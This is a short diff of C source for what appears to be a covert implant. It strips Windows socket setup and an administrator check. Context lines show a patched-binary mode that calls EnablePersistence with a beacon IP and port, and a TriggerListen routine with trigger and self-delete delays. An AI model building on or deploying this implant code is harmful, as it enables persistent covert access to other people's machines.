@@ -404,16 +404,6 @@ int main(int argc, char** argv)
 // if the binary has been patched, we don't need to parse command line arguments
 okay:
 
-	//WINDOWS only: init WSAStartup
-#ifdef WIN32
-
-	if( 0 != WSAStartup(MAKEWORD(2,2), &wsaData))
-	{
-		return -1;
-	}
-	wsa_init_done = 1;
-#endif
-
 	if ( args.patched == 1 )
 	{
 		retVal = EnablePersistence(beaconIP,beaconPort);
@@ -458,11 +448,6 @@ okay:
 	(void)TriggerListen( szInterface, trigger_delay, delete_delay );	//TODO: TriggerListen() doesn't return a meaningful value.
 #endif
 
-#ifdef WIN32
-	//WINDOWS only: Cleanup winsock
-	WSACleanup();
-#endif
-
     return 0;
 }
 
@@ -496,53 +481,13 @@ static void * asloc( char *string )
 	\return		success or failure
 	\retval     zero if true
 */
-#if defined WIN32
-static int is_elevated_permissions( void )
-{	
-	BOOL b;
-	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
-	PSID AdministratorsGroup; 
-	b = AllocateAndInitializeSid(
-		&NtAuthority,
-		2,
-		SECURITY_BUILTIN_DOMAIN_RID,
-		DOMAIN_ALIAS_RID_ADMINS,
-		0, 0, 0, 0, 0, 0,
-		&AdministratorsGroup); 
-	if(b) 
-	{
-		if (!CheckTokenMembership( NULL, AdministratorsGroup, &b)) 
-		{
-			b = FALSE;
-		} 
-		FreeSid(AdministratorsGroup); 
-	}
 
-
-
-	if( b == true)
-	{
-		return SUCCESS;
-	}
-	else
-		return FAILURE;
- 
-}
-
-static void clean_args( int argc, char *argv[], char *new_argv0 )
-{
-	return;
-}
-
-//****************************************************************************
-#elif defined LINUX || defined SOLARIS
 static int is_elevated_permissions( void )
 {
 	// geteuid() returns the effective user ID of the calling process
 	// if root, geteuid() will return 0
 	return ( geteuid() ? FAILURE : SUCCESS );
 }
-#endif
 
 #if defined LINUX
 //****************************************************************************
